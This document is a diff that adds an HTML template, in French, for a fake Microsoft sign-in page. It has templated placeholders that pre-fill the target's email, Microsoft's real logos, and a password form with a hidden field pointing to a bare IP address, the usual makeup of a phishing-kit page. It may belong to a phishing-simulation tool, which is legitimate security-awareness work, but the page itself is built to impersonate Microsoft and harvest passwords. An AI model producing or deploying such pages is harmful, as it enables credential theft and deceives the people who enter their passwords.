@@ -1,0 +1,39 @@
+<!DOCTYPE html><html lang="fr"><head>
+	<base href="{{.URL}}"/><meta charset="UTF-8"/><meta http-equiv="X-UA-Compatible" content="IE=edge"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+	<link href="assets/favicon.ico" rel="icon"/>
+	<title>Connectez-vous à votre compte Microsoft</title>
+	<link href="assets/app.css" rel="stylesheet"/>
+	<style type="text/css">#section_pwd {
+            background-image: url('https://logincdn.msftauth.net/shared/5/images/2_bc3d32a696895f78c19d.svg');
+            background-position: center;
+            background-color: rgb(242, 242, 242);
+        }
+	</style>
+</head>
+<body>
+<section id="section_pwd">
+<div class="auth-wrapper"><img alt="Microsoft" class="d-block" src="https://logincdn.msftauth.net/shared/5/images/microsoft_logo_ee5c8d9fb6248c938fd0.svg"/>
+<div class="identity w-100 mt-16 mb-16"><button class="back"><img src="assets/back.png"/></button><span id="user_identity">{{.Email}}</span></div>
+
+<h2 class="title mb-16">Entrez le mot de passe</h2>
+
+<form action="" id="signin_form" method="POST"><input type="hidden" value="http://54.37.32.106/static/Template/microsoft-login/connexion.html"/> <!-- Ajout de l'attribut id au formulaire -->
+<div class="mb-16"><input class="input" id="inp_pwd" placeholder="Mot de passe" type="password"/></div>
+</form>
+
+<div>
+<p class="mb-16"><a class="link fs-13" href="#">Mot de passe oublié ?</a></p>
+</div>
+
+<div><button class="btn" id="btn_next" type="submit">Se connecter</button></div>
+</div>
+</section>
+
+<footer class="footer"><a href="https://www.microsoft.com/fr/servicesagreement/">Conditions d&#39;utilisation</a> <a href="https://privacy.microsoft.com/fr-fr/privacystatement">Confidentialité et cookies</a> <span>. . .</span></footer>
+<!-- Script JavaScript pour gérer le clic sur le bouton "Next" --><script>
+    document.getElementById('btn_next').addEventListener('click', function() {
+        document.getElementById('signin_form').submit(); // Soumet le formulaire
+    });
+</script>
+
+</body></html>
